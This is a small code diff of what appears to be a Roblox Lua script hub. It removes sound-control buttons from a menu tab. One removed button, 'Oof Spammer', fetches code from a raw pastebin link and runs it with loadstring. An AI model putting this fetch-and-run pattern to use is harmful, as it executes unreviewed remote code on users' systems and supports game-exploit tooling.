@@ -590,28 +590,7 @@ local Tab = Window:MakeTab({
     local Section = Tab:AddSection({
 	Name = "Sound"
 })
-    Tab:AddButton({
-    Name     = "Play All Sounds",
-    Callback = function()
-             for _, v in pairs(cont:FindFirstChild("Sounds"):GetChildren()) do
-            v:Play()
-        end
-    end    
-})
-Tab:AddButton({
-    Name     = "Stop All Sounds",
-    Callback = function()
-             for _, v in pairs(cont:FindFirstChild("Sounds"):GetChildren()) do
-                 v:Stop()
-        end
-    end    
-})
-Tab:AddButton({
-    Name     = "Oof Spammer",
-    Callback = function()
-             loadstring(game:HttpGet("https://pastebin.com/raw/JaMbzp0B", true))()
-    end    
-})
+
 Tab:AddButton({
     Name     = "Sound Gui",
     Callback = function()
